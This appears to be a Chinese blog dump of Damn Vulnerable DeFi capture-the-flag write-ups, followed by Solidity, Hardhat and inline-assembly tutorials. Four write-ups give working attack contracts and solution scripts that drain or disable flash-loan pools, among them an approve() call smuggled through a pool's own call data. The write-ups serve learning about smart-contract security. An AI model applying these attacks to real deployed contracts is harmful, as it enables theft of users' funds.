emmmmm，分析可知，只能存多少记录多少，看了看自己手中的 1 ether………还是继续往下看吧。 falshLoan() 12345678function flashLoan(uint256 amount) external &#123; uint256 balanceBefore = address(this).balance; IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;(); if (address(this).balance &lt; balanceBefore) revert RepayFailed();&#125; 嗯哼？看起来很简单，先给msg.sender转 amount数目的钱，再执行 execute函数。 又因为，execute函数定义在接口中，所以我们可以自定义该函数，由知道该操作是先给我们钱，再让我们去执行 execute，那就很简单了，我们可以那这 amount数目的钱拿去存，存在该合约中，到时候 一定会满足address(this).balance &lt; balanceBefore该条件，同时也可以在 msg.sender 的名义下存款，当然 msg.sender 就可以从 借贷池取款了，属于是空手套白狼了。 注意： 本题也没那么简单，想到了思路实现起来还是有点细节的。比如我们可以利用接口的知识，自定义一个接口，那么此时 IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;()中的 msg.sender一定得是，自定义 execute函数的合约地址（我的水平有限，不能马上理清层层调用的 msg.sender 是谁）。 我的理解是：外部账户（player）在实现了execte函数的合约（SideEntranceHack）中，通过pool调用pool中的 falshLoan函数，此时对于SideEntranceHack合约来说msg.sender是外部账户，对于操作pool来说，pool的msg.sender就是address(SideEntranceHack)。 所以，我们不管怎么弄，都不能以 player 为 msg.sender 来调用 withdraw 函数。 3. solving先写攻击合约 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SideEntranceLenderPool.sol&quot;;contract SideEntranceHack &#123; SideEntranceLenderPool pool; address payable owner; constructor(address _addr) &#123; owner = payable(msg.sender); pool = SideEntranceLenderPool(_addr); &#125; function execute() external payable&#123; pool.deposit&#123;value: 1000 ether&#125;(); &#125; function attack(uint amount) public &#123; pool.flashLoan(amount); pool.withdraw(); &#125; receive () external payable &#123; owner.transfer(address(this).balance); &#125;&#125; 攻击思路，先利用 借贷池借给我的 1000 ethers，以 attacker 的名义存钱，再以 attacker 的名义取钱，最后将钱转发至 player的账户。 js题解 12345it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacter = await (await ethers.getContractFactory(&#x27;SideEntranceHack&#x27;, player)).deploy(pool.address); await attacter.attack(ETHER_IN_POOL); &#125;); 解题成功","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Truster","slug":"CTFS/damn defi/Truster","date":"2023-07-10T03:37:10.000Z","updated":"2023-07-10T03:37:10.000Z","comments":true,"path":"2023/07/10/CTFS/damn defi/Truster/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/CTFS/damn%20defi/Truster/","excerpt":"","text":"1. issue More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. The pool holds 1 million DVT tokens. You have nothing. To pass this challenge, take all tokens out of the pool. If possible, in a single transaction. 目标：身无分文的你要将借贷池的钱全取出来。 题目链接 2. analysing2.1 寻找balance是什么 通过使用ethers.provider.getBalance()查询 pool.address的balance可以看到为 0， 但是通过token.balanceOf()可以查看到 balance为 1000000 ether。所以，题目所要借光的是 ERC20 token，要想对token的值动手，只能调用 ERC20 下的 转账操作，比如transfer(), transferFrom()。 2.2 TrusterLenderPool.sol分析flashLoan函数 1234567891011121314151617function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool)&#123; // 记录当前借贷池的 balance uint256 balanceBefore = token.balanceOf(address(this)); // 他这里是从 token 中给 用户贷款，不涉及借贷池本身？ token.transfer(borrower, amount); // 细读 `functionCall` target.functionCall(data); if (token.balanceOf(address(this)) &lt; balanceBefore) revert RepayFailed(); return true; flashLoan写的很简单，需要注意的是，token.transfer(borrower, amount) 看到是token给borrower转账，这里要引起注意；target.functionCall(data);这行代码需要层层追踪才可以发现里面的新天地。 解读functionCall: 对data进行追踪，发现是functionCallWithValue在被使用的 123456789101112function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) &#123; require(address(this).balance &gt;= value, &quot;Address: insufficient balance for call&quot;); require(isContract(target), &quot;Address: call to non-contract&quot;); (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data); return verifyCallResult(success, returndata, errorMessage);&#125; (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data);中，有 data，这行代码其实是在调用函数，而函数就是被编译成为字节码的 data，所以 target就理所应当是包含 data函数的合约地址。 再进一步分析，我们的初衷是改变 balance，能改变balance的只有 转账操作，一种是 使用 transfer另一种中是transferFrom 如果使用transfer 12345678910111213function transfer(address to, uint256 amount) public virtual returns (bool) &#123; balanceOf[msg.sender] -= amount; // Cannot overflow because the sum of all user // balances can&#x27;t exceed the max uint256 value. unchecked &#123; balanceOf[to] += amount; &#125; emit Transfer(msg.sender, to, amount); return true;&#125; 要符合题意既要把pool的钱花光，还要给play.address地址转入一百万ether，使用 transfer能满足后者，但不能满足前一个条件 12let attackToken1 = token.connect(deployer); await attackToken1.transfer(player.address,TOKENS_IN_POOL)； 所以只能使用 transferFrom 如果使用 transferFrom 123456789101112131415161718192021function transferFrom( address from, address to, uint256 amount) public virtual returns (bool) &#123; uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals. if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; // Cannot overflow because the sum of all user // balances can&#x27;t exceed the max uint256 value. unchecked &#123; balanceOf[to] += amount; &#125; emit Transfer(from, to, amount); return true;&#125; 只要我们能够将transferFrom函数成功调用，就可以解决问题了。from的值为pool.address, to的值为player.address。能执行操作 1000000ether 就 必须让 pool.address 给 play.address approve 1000000ether的操作权限。 所以，data的值就是 transferFrom 的字节码。 approve函数 1234567function approve(address spender, uint256 amount) public virtual returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;&#125; 由call的使用原理可知，msg.sender就是 pool的合约地址。 3. solving3.1 TrusterHack.sol12345678910111213141516// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./TrusterLenderPool.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;contract TrusterHack &#123; function attack(address _pool, address _recevier, address _token) external &#123; // 通过pool地址，给玩家地址授权 bytes memory func_abi = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, _recevier, 1000000 ether); // 调用flashLoan TrusterLenderPool(_pool).flashLoan(0, _recevier, _token, func_abi); // DamnValuableToken(_token).transferFrom(_pool, _recevier, 1000000 ether); &#125;&#125; 注意：在合约中是不能调用transferFrom函数的，因为你不能将任意一个地址强转成ERC20类型，然后调用其中的方法（个人理解） 3.2 challenge.js1234567it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacker = await (await ethers.getContractFactory(&#x27;TrusterHack&#x27;, player)).deploy(); let attackToken = token.connect(player); await attacker.attack(pool.address, player.address, token.address); await attackToken.transferFrom(pool.address, player.address,TOKENS_IN_POOL);&#125;); 解题成功~ 还有另一种解题方式，通过etherjs 来解题的，原理都一样，实现的方法不同: 方法二","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Naive receiver","slug":"CTFS/damn defi/Naive receiver","date":"2023-07-09T07:37:10.000Z","updated":"2023-07-09T07:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/Naive receiver/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/Naive%20receiver/","excerpt":"","text":"1. issue There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH. A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH. Take all ETH out of the user’s contract. If possible, in a single transaction. 简单来说，就是要将贷款人手中的钱变成 0。 题目链接 2. analysing2.1 FlashLoanReceiver.sol123456789101112131415161718192021222324252627282930function onFlashLoan( address, address token, uint256 amount, uint256 fee, bytes calldata ) external returns (bytes32) &#123; assembly &#123; // gas savings if iszero(eq(sload(pool.slot), caller())) &#123; mstore(0x00, 0x48f5c3ed) revert(0x1c, 0x04) &#125; &#125; if (token != ETH) revert UnsupportedCurrency(); uint256 amountToBeRepaid; // 计算带偿还金额 unchecked &#123; amountToBeRepaid = amount + fee; &#125; _executeActionDuringFlashLoan(); // Return funds to pool ==》 向借贷池还钱 SafeTransferLib.safeTransferETH(pool, amountToBeRepaid); return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;); &#125; 解读： 贷款人还款的操作，还款 &#x3D; 贷款数目 + 手续费 2.2 NaiveReceiverLenderPool.sol123456789101112131415161718192021222324252627282930313233/** 闪电贷函数 */ function flashLoan( IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data ) external returns (bool) &#123; // receiver 的 ETH 相对应 if (token != ETH) revert UnsupportedCurrency(); // 当前合约的 balance uint256 balanceBefore = address(this).balance; // 向 receiver 转 amount 数目的金额 // Transfer ETH and handle control to receiver SafeTransferLib.safeTransferETH(address(receiver), amount); if(receiver.onFlashLoan( msg.sender, ETH, amount, FIXED_FEE, data ) != CALLBACK_SUCCESS) &#123; revert CallbackFailed(); &#125; if (address(this).balance &lt; balanceBefore + FIXED_FEE) revert RepayFailed(); return true; &#125; 解读： 借贷池 闪电贷函数，贷款和还款在同一笔交易中，保证 贷款人还款之后的金额大于未贷款的金额。 3. solving易知，每一笔贷款都需要缴纳 1ether的手续费，而用户只有 10ether，按理来说只要进行十次借贷操作就可以将用户手中的10个ether花光。如下： 1234567 it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ let ETH = await pool.ETH()； for (let i = 0; i &lt; 10; i++) &#123; await pool.flashLoan(receiver.address, ETH, 0, &quot;0x&quot;); &#125;&#125;); 这样，的结果也是正确的 但是，题目要求在一笔交易中完成，那就很简单了，将这10次调用放在一个合约中即可。 Hack.sol: 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./FlashLoanReceiver.sol&quot;;import &quot;./NaiveReceiverLenderPool.sol&quot;;contract Hack &#123; address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; function attack(address payable _pool, address payable _receiver) external &#123; for (uint256 i = 0; i &lt; 10; i++) &#123; NaiveReceiverLenderPool(_pool).flashLoan( IERC3156FlashBorrower(_receiver), ETH, 0 ether, &quot;&quot; ); &#125; &#125;&#125; naive-receiver.challenge.js 123456it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const AttractContract = await ethers.getContractFactory(&#x27;Hack&#x27;, player); const attracter = await AttractContract.deploy(); await attracter.attack(pool.address, receiver.address); &#125;); 运行结果： 解题成功。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"","slug":"CTFS/damn defi/ABI Smuggling","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/ABI Smuggling/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/ABI%20Smuggling/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"","slug":"CTFS/damn defi/Puppet V3","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/Puppet V3/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/Puppet%20V3/","excerpt":"","text":"1. issue2. analysing3. solving","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Unstoppable","slug":"CTFS/damn defi/Unstoppable","date":"2023-07-09T03:37:10.000Z","updated":"2023-07-09T03:37:10.000Z","comments":true,"path":"2023/07/09/CTFS/damn defi/Unstoppable/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/CTFS/damn%20defi/Unstoppable/","excerpt":"","text":"1. issue There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop offering flash loans. You start with 10 DVT tokens in balance. 简单来说：就是让这个金库停止提供闪电贷 题目链接 2.analysingReceiverUnstoppable.sol 和 UnstoppableVault.sol 源码链接 由简入难 分析ReceiverUnstoppable.sol: 1234567891011121314function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) &#123; if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0) revert UnexpectedFlashLoan(); ERC20(token).approve(address(pool), amount); return keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;);&#125; ERC20(token).approve(address(pool), amount): ERC20底层代币给UnstoppableVault金库授权，允许金库支配多少数量的金额 123456789function executeFlashLoan(uint256 amount) external onlyOwner &#123; address asset = address(pool.asset()); pool.flashLoan( this, asset, amount, bytes(&quot;&quot;) );&#125; 调用 UnstoppableVault的flashLoan函数 分析UnstoppableVault.sol: 12345678910111213141516171819202122232425262728293031function flashLoan( IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data) external returns (bool) &#123; // 贷款数目不能为0 if (amount == 0) revert InvalidAmount(0); // fail early // 要金库应为当前金库 if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement // balanceBefore = balanceOf(address(this)) =&gt; address(this)=vault uint256 balanceBefore = totalAssets(); // 保险库的总金额 // totalSupply 是铸币是赋值 初始值 = balanceOf(vault) if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement uint256 fee = flashFee(_token, amount); // transfer tokens out + execute callback on receiver ERC20(_token).safeTransfer(address(receiver), amount); // callback must return magic value, otherwise assume it failed if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)) revert CallbackFailed(); // pull amount + fee from receiver, then pay the fee to the recipient ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee); ERC20(_token).safeTransfer(feeRecipient, fee); return true;&#125; 要使整个借贷池崩溃很简单，就是将这个借贷函数弄坏（即无法调用），分析可知，只有if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();该条语句才能将借贷函数在底层将其破坏，不受调用者输入参数所影响。 进一步分析： balanceBefore是通过调用 totalAssets() 函数得来的，而 totalAssets() 就是将当前借贷池的余额返回（会受到交易的影响），而 totalSupply 表示金库最大供给额度，只受铸币和销币的影响。 所以，只要在初始化的时候，我们的第一笔交易就是给我们的借贷池转入任意一笔钱，此时 convertToShares(totalSupply) != balanceBefore永远不可能成立，就不能从借贷池贷款了。 注意 convertToShares 函数 12345function convertToShares(uint256 assets) public view virtual returns (uint256) &#123; uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero. return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());&#125; 执行 convertToShares(totalSupply)的结果就是 totalSupply。 3. solvingjs文件中： 12345it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attract = token.connect(player); await attract.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);&#125;); 测试： 通过。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"using 的使用","slug":"Basic_Knowledge/solidity/Using的使用","date":"2023-07-08T14:47:10.000Z","updated":"2023-07-08T14:47:10.000Z","comments":true,"path":"2023/07/08/Basic_Knowledge/solidity/Using的使用/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Basic_Knowledge/solidity/Using%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1.语法1using A for * // 效果是，库A中的函数被附着在做任意的类型上 指令using A for B;用来附着库里定义的函数(从库A)到任意类型B。这些函数将会默认接收调用函数对象的实例作为第一个参数。 2. 示例代码2.1 Math库合约：123456789101112// 声明一个库合约library Math &#123; // 定义一个加法函数 function add(Test1 test1, uint256 a, uint256 b) external pure returns (uint256) &#123; return a + b; &#125; // 定义一个乘法函数 function mul(uint256 a, uint256 b) external pure returns (uint256) &#123; return a * b; &#125;&#125; 2.2 测试合约：12345678// 测试合约contract Test1 &#123; address owner; function getOwner() external view returns(address) &#123; return owner; &#125;&#125; 2.3 引用库合约：123456789101112131415// 合约中使用库合约contract Calculator&#123; using Math for Test1; // 使用库合约中的加法函数 function add(address _test, uint256 a, uint256 b) external pure returns (uint256) &#123; return Test1(_test).add(a, b); &#125; // 使用库合约中的乘法函数 function mul(uint256 a, uint256 b) external pure returns (uint256) &#123; return Math.mul(a, b); &#125;&#125; 2.4 解读引用库合约using Math for Test1：Test 合约都具有Math合约的功能。 Test1(_test).add(a, b)：从库合约可以知道，add函数的形参为 add(Test1 test1, uint256 a, uint256 b)，在该函数会默认把调用者作为第一个参数，即 Test1合约。 3. 测试3.1 部署 Test1, Calculator 3.2 使用Test1的地址调用add函数 成功调用","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"hardhat_using","slug":"Utils/Hardhat/hardhat_self","date":"2023-07-04T05:47:10.000Z","updated":"2023-07-04T05:47:10.000Z","comments":true,"path":"2023/07/04/Utils/Hardhat/hardhat_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/04/Utils/Hardhat/hardhat_self/","excerpt":"","text":"官方文档 中文文档1. 基本指令(编译、测试、部署)1.1 执行 npx hardhat报错 原因： 缺少”@nomicfoundation/hardhat-toolbox“Hardhat插件。 解决方案： 1npm install --save-dev @nomicfoundation/hardhat-toolbox 如果报以下错误，则再执行一遍 npm install --save-dev @nomicfoundation/hardhat-toolbox即可 1.2 编译合约1npx hardhat compile 1.3 运行测试1npx hardhat test test/Lock.js 如果因为之前在对合约的创建的时候，文件名和合约名不一样，重命名会出现test报错的情况，解决方法就是，将当前工作目录下编译生成的artifacts和cache文件删除，再执行npx hardhat compile，重新编译。 1.4 运行js文件(部署合约)1npx hardhat run scripts/deploy.js 1.5 将钱包或dapp连接到hardhat网络1npx hardhat node 1npx hardhat run scripts/deploy.js --network localhost 注：需要将本地网络启动，即需要开启两个终端，一个用于挂载网络，一个用于测试 2. 创建一个基本的项目2.1 创建命令在你要创建项目的文件夹（空文件夹）下执行如下命令： 1npx hardhat 初始化的项目结构如下： 1234contracts/scripts/test/hardhat.config.js contracts/是合同源文件所在的位置。 test/是你的测试应该去的地方。 scripts/这是简单的自动化脚本所在的位置。 3. 对合约进行测试3.1 语法格式123456const &#123; ethers &#125; = require(&quot;hardhat&quot;);describe(&quot;&quot;/* 自定义本次测试名 */,function()&#123; it(&quot;&quot;/* 自定义dan&#x27;yuan测试名 */, async function () &#123; /* your code*/ &#125;);&#125;); 3.2 测试合约（无参构造器） MyContract1.sol： 123456789101112131415161718// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;hardhat/console.sol&quot;;contract MyContract1 &#123; address owner; constructor() &#123; owner = msg.sender; &#125; function getOwner() external view returns(address) &#123; console.log(unicode&quot;这是一个测试合约！&quot;); return owner; &#125;&#125; 解读： import &quot;hardhat/console.sol&quot;：其作用是从hardhat文件夹下引入console.sol合约 （但是我翻了个遍，在本地都找不到这个合约）; console.log()：其作用是在控制台打印输出自定义结果； unicode&quot;这是一个测试合约！&quot;：其作用是为了输出中文（solidity中不支持直接输出中文）在汉字字符串前加上unicode。 MyContract1.js： 1234567891011121314const &#123; ethers &#125; = require(&quot;hardhat&quot;); describe(&quot;MyContract&quot;, function () &#123; it(&quot;Here is demo&quot;, async function () &#123; const myContract = await ethers.getContractFactory(&quot;MyContract1&quot;); // const con = await myContract.deploy(); const owner = await con.getOwner(); console.log(&quot;MyContract 的拥有者是 &quot; + owner); &#125;); &#125;); 解读： describe(&quot;MyContract&quot;, function ()&#123;&#125;): 创建测试套件，名称为 “MyContract”; it(&quot;Here is demo&quot;, async function () &#123;&#125; ：创建测试用例，名称为 “Here is demo”(可以在一个describe中创建多个it)； const myContract = await ethers.getContractFactory(&quot;MyContract1&quot;)： 获取 “MyContract1” 智能合约的工厂对象； const con = await myContract.deploy()： 部署 “MyContract1” 智能合约； const owner = await con.getOwner()： 调用智能合约中的 getOwner() 方法获取合约的拥有者。 3.3 测试合约（有参构造器） MyContract2.sol： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract2 &#123; address owner; string name; constructor(string memory _name) &#123; owner = msg.sender; name = _name; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;这是MyContract1合约&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; MyContract2.js： 1234567891011121314151617181920212223242526272829303132const &#123; ethers &#125; = require(&quot;hardhat&quot;);// const &#123; ethers &#125; = require(&quot;ethers&quot;);describe(&quot;MyContract2&quot;, async function () &#123; it(&quot;To test ethers.provider.getStorageAt()&quot;, async function()&#123; const MyContract2 = await ethers.getContractFactory(&quot;MyContract2&quot;); // console.log(MyContract1); const contract = await MyContract2.deploy(&quot;libiyou&quot;); console.log(contract); const owner = await contract.getOwner(); console.log(`owner =&gt; $&#123;owner&#125;`); const name1 = await contract.getName(); console.log(`name1 =&gt; $&#123;name1&#125;`); await contract.setName(&quot;biyou&quot;); const name2 = await contract.getName(); console.log(`name2 =&gt; $&#123;name2&#125;`); await contract.print(); // const salt0 = await ethers.provider.getStorage(&quot;0x5FbDB2315678afecb367f032d93F642f64180aa3&quot;,0); // console.log(salt0); &#125;)&#125;) 4. 将合约部署到本地开发节点4.1 语法格式启动本地节点命令： 1npx hardhat node npx命令： 1npx hardhat run scripts/deploy_MyContract2.js --network localhost js代码： 123456789101112const hre = require(&quot;hardhat&quot;);async function main() &#123; const toDeployContract = &quot;&quot;; // 要部署的合约名 const contract = await hre.ethers.deployContract(toDeployContract,[params...]/* 构造器的形参个数 */,&#123; value: // 给合约注入的金额 &#125;);&#125;main().catch((error) =&gt; &#123; console.error(error);&#125;) 4.2 部署合约 （无参构造器）MyContract1.sol： 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract1 &#123; address owner; string name; constructor() &#123; owner = msg.sender; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;这是MyContract1合约&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; deploy_MyContract1.js： 12345678910111213141516171819const hre = require(&quot;hardhat&quot;);async function main() &#123; const contract = await hre.ethers.deployContract(&quot;MyContract1&quot;); // console.log(contract); await contract.waitForDeployment(); console.log(await contract.getAddress()); await contract.setName(&quot;biyou&quot;); let name1 = await contract.getName(); console.log(name1); contract.print();&#125;main().catch((error) =&gt; &#123; console.error(error);&#125;) 运行结果： 4.3 部署合约 （有参构造器）MyContract2.sol： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract2 &#123; address owner; string name; constructor(string memory _name) &#123; owner = msg.sender; name = _name; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;这是MyContract1合约&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; deploy_MyContract2.js： 12345678910111213141516171819202122232425const hre = require(&quot;hardhat&quot;);const &#123; ethers &#125; = require(&quot;hardhat&quot;);async function main() &#123; // [&quot;lby&quot;] 表示往构造器中传入参数 const contract = await hre.ethers.deployContract(&quot;MyContract2&quot;,[&quot;lby&quot;]); const address = await contract.getAddress(); console.log(address); let slot0 = await ethers.provider.getStorage(address, 0); let slot1 = await ethers.provider.getStorage(address, 1); console.log(`slot0 =&gt; $&#123;slot0&#125;\\nslot1 =&gt; $&#123;slot1&#125;`); await contract.setName(&quot;biyou&quot;); let name = await contract.getName(); console.log(`name =&gt; $&#123;name&#125;`); slot0 = await ethers.provider.getStorage(address, 0); slot1 = await ethers.provider.getStorage(address, 1); console.log(`slot0 =&gt; $&#123;slot0&#125;\\nslot1 =&gt; $&#123;slot1&#125;`);&#125;main().catch((error)=&gt;&#123; console.log(error);&#125;) 运行结果： 5. 将合约部署到测试网络这里以polygon为例 polygon faucet链接 polygonscan链接 视频教学 5.1 先启动 hardhat本地开发节点命令： 1npx hardhat node 5.2 编写配置文件*hardhat.config.js*： 123456789101112networks: &#123; localhoat: &#123; url: &quot;http://127.0.0.1:8545&quot;, chainId: 31337, accounts: [process.env.PRIVATE_KEY] &#125;, polygon: &#123; url: &quot;&#x27;https://matic-mumbai.chainstacklabs.com&quot;, chainId: 80001, accounts: [POLYGON_PRIVATE_KEY] &#125; &#125; 5.3 将本地节点导入小狐狸钱包 5.4 到 polygon 水龙头领取测试币 5.将合约部署到polygon测试网执行如下命令 1npx hardhat run scripts/deploy_MyContract2.js --network polygon","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"hardhat","slug":"Utils/hardhat","permalink":"https://biyouqiuqiu.com/categories/Utils/hardhat/"}],"tags":[{"name":"hardhat","slug":"hardhat","permalink":"https://biyouqiuqiu.com/tags/hardhat/"}]},{"title":"内联汇编","slug":"Basic_Knowledge/solidity/内联汇编","date":"2023-07-01T00:47:10.000Z","updated":"2023-07-01T00:47:10.000Z","comments":true,"path":"2023/07/01/Basic_Knowledge/solidity/内联汇编/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/01/Basic_Knowledge/solidity/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/","excerpt":"","text":"官方文档✈注：solidity内联汇编中都是以字节为单位的，[0x00,0x20)表示的范围是2^32-1,但在计算机中占了256位，256 &#x2F;8&#x3D;32&#x3D;0x20 1. 语法和 solidity一样，Assembly 也会解析注释、文字和标识符，所以你可以使用通常的 // 和 /* */ 来进行注释。 内联汇编程序由 assembly &#123; ... &#125; 来标记，在这些大括号内可以使用以下内容。 字面常数，也就是 0x123、42 或 &quot;abc&quot; （不超过 32 个字符的字符串） 操作码（在“instruction style”内），比如 mload sload dup1 sstore，操作码列表请看后面 函数风格操作码，比如 add(1，mlod(0)) 标签，比如 name: 变量声明，比如 let x := 7、let x := add(y, 3) 或者 let x （初始值将被置为 empty(0)） 标识符（标签或者汇编局部变量以及用作内联汇编时的外部变量），比如 jump(name)、3 x add 赋值（在“instruction style”内），比如 3 =: x 函数风格赋值，比如 x := add(y，3) 一些控制局部变量作用域的语句块，比如 &#123;let x := 3 &#123; let y := add(x，1) &#125;&#125; 2. 常用操作码注：在下表中，mem[a...b) 表示从位置 a 开始至（不包括）位置 b 的内存字节数，storage[p] 表示位置 p 处的存储内容。 Instruction Explanation stop - F 停止执行，与 return(0,0) 等价 add(x, y) F x + y sub(x, y) F x - y mul(x, y) F x * y div(x, y) F x &#x2F; y sdiv(x, y) F x &#x2F; y，以二进制补码作为符号 mod(x, y) F x % y smod(x, y) F x % y，以二进制补码作为符号 exp(x, y) F x 的 y 次幂 not(x) F ~x，对 x 按位取反 lt(x, y) F 如果 x &lt; y 为 1，否则为 0 gt(x, y) F 如果 x &gt; y 为 1，否则为 0 slt(x, y) F 如果 x &lt; y 